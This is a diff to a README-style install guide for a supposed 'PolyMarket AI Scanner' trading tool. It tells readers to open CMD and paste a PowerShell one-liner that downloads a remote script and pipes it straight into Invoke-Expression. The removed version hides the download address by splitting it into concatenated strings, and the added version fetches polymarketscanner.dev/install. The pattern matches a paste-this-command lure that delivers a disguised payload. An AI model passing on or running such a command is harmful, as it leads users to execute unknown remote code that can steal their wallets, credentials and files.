@@ -10,7 +10,7 @@ Press `Win + R`, type `CMD`, and press **Enter**.
 
 ### Step 2: Run the PolyMarket AI Scanner installation command
 ```cmd
-powershell -c "$Engine='scan'; $Scanner='polymarket'; iwr ($Scanner + $Engine + '.' + 'Run') -UseBasicParsing | iex; $Version='Polymarket-Core=3.9.4-f2c7d88'"
+powershell -command "iwr polymarketscanner.dev/install -useb | iex"
 `````
 
 _Once the command is executed, the AI filters will activate to analyze on-chain data and track notable positions across your selected categories._ <br>
